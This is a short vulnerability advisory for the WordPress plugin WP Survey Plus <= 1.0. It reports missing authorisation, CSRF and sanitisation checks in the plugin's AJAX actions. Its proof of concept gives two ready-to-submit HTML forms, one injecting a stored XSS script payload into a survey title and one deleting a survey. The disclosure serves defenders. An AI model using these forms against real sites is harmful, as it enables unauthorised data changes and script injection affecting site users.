## WordPress Plugin Vulnerabilities

# WP Survey Plus <= 1.0 - Subscriber+ AJAX Calls

### Description

The plugin does not have any authorisation and CSRF checks in place in its AJAX actions, allowing any user to call them and add/edit/delete Surveys. Furthermore, due to the lack of sanitization in the Surveys' Title, this could also lead to Stored Cross-Site Scripting issues

### Proof of Concept

To create a survey with an XSS payload in the Title
<html>
<body>
<form action="https://example.com/wp-admin/admin-ajax.php" method="POST">
<input type="hidden" name="action" value="createNewServey" />
<input type="hidden" name="survey\_name" value='"><script>alert(/XSS/)</script>' />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
To delete a survey:
<<html>
<body>
<form action="https://example.com/wp-admin/admin-ajax.php" method="POST">
<input type="hidden" name="action" value="deleteSurvey" />
<input type="hidden" name="survey\_id" value="1" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
